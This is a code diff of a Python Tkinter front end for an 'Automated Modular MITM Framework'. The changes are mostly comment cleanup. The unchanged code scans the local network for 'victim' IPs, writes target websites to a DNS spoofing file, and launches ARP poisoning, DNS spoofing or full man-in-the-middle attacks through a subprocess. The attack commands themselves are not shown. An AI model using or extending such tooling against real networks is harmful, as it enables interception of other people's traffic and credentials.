@@ -1,7 +1,7 @@
 import os, subprocess, socket, threading, tkinter as tk
 from tkinter import messagebox, ttk
 
-# --- Automated Network Discovery ---
+#Automated Network Discovery
 
 def get_network_info():
     """Detects Attacker IP and Gateway automatically."""
@@ -36,19 +36,19 @@ def scan_network():
         print(f"Scan error: {e}")
         return ["No victims found"]
 
-# --- UI Actions ---
+#UI Actions
 
 def refresh_ips():
     """Triggered by the Refresh button to update the victim listbox."""
     status_label.config(text="Scanning network... please wait.")
     root.update()
     
-    # Clear the listbox first
+    #Clear the listbox first
     victim_listbox.delete(0, tk.END)
     
     new_ips = scan_network()
     
-    # Insert each IP found into the listbox
+    #Insert each IP found into the listbox
     if new_ips and new_ips[0] != "No victims found":
         for ip in new_ips:
             victim_listbox.insert(tk.END, ip)
@@ -57,16 +57,16 @@ def refresh_ips():
         status_label.config(text="No devices found.")
 
 def on_save_and_run():
-    # Get all selected items from the listbox
+    #Get all selected items from the listbox
     selected_indices = victim_listbox.curselection()
     if not selected_indices:
         messagebox.showerror("Error", "Please select at least one Victim IP.")
         return
     
-    # Join them with commas: "192.168.1.5,192.168.1.10"
+    #Join them
     victims = ",".join([victim_listbox.get(i) for i in selected_indices])
     
-    # Get websites (Comma separated: google.com, facebook.com)
+    #Get websites
     website_raw = website_var.get().strip()
     if not website_raw:
         messagebox.showerror("Error", "Please enter at least one Target Website.")
@@ -74,7 +74,7 @@ def on_save_and_run():
 
     attacker_ip, gateway = get_network_info()
 
-    # Write multiple websites to the DNS file
+    #Write multiple websites to the DNS file
     dns_file = os.path.join(os.path.dirname(__file__), "dnsSpoofed.txt")
     with open(dns_file, "w") as f:
         site_list = [s.strip() for s in website_raw.split(",")]
@@ -87,7 +87,7 @@ def on_save_and_run():
     subprocess.Popen(cmd)
     status_label.config(text=f"Attack running on {len(selected_indices)} targets.")
 
-# --- The UI ---
+#The UI
 root = tk.Tk()
 root.title("Automated Modular MITM Framework")
 root.geometry("500x600")
@@ -96,7 +96,7 @@ root.configure(bg="#d9d9d9")
 main_frame = tk.Frame(root, bg="#d9d9d9")
 main_frame.pack(expand=True, padx=20)
 
-# 1. Victim Selection (Automated)
+#Victim Selection
 tk.Label(main_frame, text="Select Victim IPs (Hold Ctrl to select multiple):", bg="#d9d9d9", font=("Arial", 10, "bold")).pack(pady=5)
 
 victim_listbox = tk.Listbox(main_frame, selectmode="multiple", width=40, height=6, bg="white")
@@ -104,12 +104,12 @@ victim_listbox.pack()
 
 tk.Button(main_frame, text="Scan Network", command=refresh_ips, bg="#cfcfcf").pack(pady=5)
 
-# 2. Website Targeting
+#Website Targeting
 tk.Label(main_frame, text="Target Website:", bg="#d9d9d9", font=("Arial", 10, "bold")).pack(pady=5)
 website_var = tk.StringVar()
 tk.Entry(main_frame, textvariable=website_var, width=40).pack()
 
-# 3. Flexible Attack Selection (Removed ARP+SSL)
+#Attack Selection
 tk.Label(main_frame, text="Attack Implementation:", bg="#d9d9d9", font=("Arial", 11, "bold")).pack(pady=15)
 attack_mode = tk.StringVar(value="full")
 modes = [("ARP Poisoning Only", "arp"), ("ARP + DNS Spoofing", "dns"), ("Full MITM Attack", "full")]
@@ -117,10 +117,8 @@ modes = [("ARP Poisoning Only", "arp"), ("ARP + DNS Spoofing", "dns"), ("Full MI
 for text, val in modes:
     tk.Radiobutton(main_frame, text=text, variable=attack_mode, value=val, bg="#d9d9d9").pack(anchor="w", padx=60)
 
-# 4. Action Button
 tk.Button(main_frame, text="START ATTACK", command=on_save_and_run, width=25, height=2, bg="#efefef", relief="raised").pack(pady=30)
 
-# Footer Status
 status_label = tk.Label(root, text="Ready", bg="#d9d9d9", font=("Arial", 8, "italic"))
 status_label.pack(side="bottom", pady=5)
 
